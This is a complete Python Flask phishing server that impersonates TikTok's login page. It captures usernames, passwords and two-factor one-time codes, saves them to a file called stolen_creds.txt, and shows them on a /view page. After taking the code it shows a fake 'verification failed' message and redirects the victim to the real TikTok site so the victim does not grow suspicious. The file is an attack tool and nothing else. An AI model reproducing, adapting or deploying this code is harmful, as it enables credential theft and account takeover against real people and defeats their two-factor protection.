#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tiktok_phisher_simple.py
Server Phishing - 2FA OTP Interception.
"""

import os
from flask import Flask, request, jsonify

app = Flask(__name__)

# الشاشة الأولى (الإيميل والباسورد)
HTML_LOGIN = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in | TikTok</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; background: #fff; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 8px; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/images/logo.svg">
        <h2>Log in to TikTok</h2>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
"""

# الشاشة التانية (كود الـ 2FA)
HTML_OTP = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify | TikTok</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; background: #fff; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 8px; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; text-align: center; font-size: 20px; letter-spacing: 5px; }
        button { width: 100%; padding: 10px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
        p { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/images/logo.svg">
        <h2>Verify your identity</h2>
        <p>We sent a 6-digit code to your phone/email. Enter it below.</p>
        <form action="/verify" method="POST">
            <input type="text" name="otp" placeholder="XXXXXX" maxlength="6" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_LOGIN

# استقبال الإيميل والباسورد
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    print("\n" + "!"*60)
    print("[🚨] DATA LOGIN DITEMUKAN! [🚨]")
    print(f"[📧] Email: {email}")
    print(f"[🔑] Password: {password}")
    print("!"*60 + "\n")
    
    # حفظ الإيميل والباسورد في ملف
    with open("stolen_creds.txt", "a", encoding="utf-8") as f:
        f.write(f"Email: {email} | Pass: {password} | OTP: (waiting)\n")
        
    # توجيه الضحية لصفحة الكود
    return HTML_OTP

# استقبال كود التحقق (OTP)
@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp')
    
    print("\n" + "!"*60)
    print("[🚨] KODE OTP DITEMUKAN! [🚨]")
    print(f"[🔢] OTP: {otp}")
    print("!"*60 + "\n")
    
    # حفظ الكود في نفس الملف
    with open("stolen_creds.txt", "a", encoding="utf-8") as f:
        f.write(f"--- OTP DITERIMA: {otp} ---\n")
        
    # توجيه الضحية لتيك توك الحقيقي عشان ميشكش
    return "<script>alert('Verification failed. Redirecting...'); window.location.href='https://www.tiktok.com/login';</script>"

@app.route('/view')
def view():
    try:
        with open("stolen_creds.txt", "r", encoding="utf-8") as f:
            content = f.read()
        if not content:
            return "<h2>Belum ada data yang tertangkap.</h2>"
        return f"<h2>Data Tertangkap:</h2><pre style='background:#f4f4f4; padding:20px;'>{content}</pre>"
    except FileNotFoundError:
        return "<h2>Belum ada data yang tertangkap.</h2>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
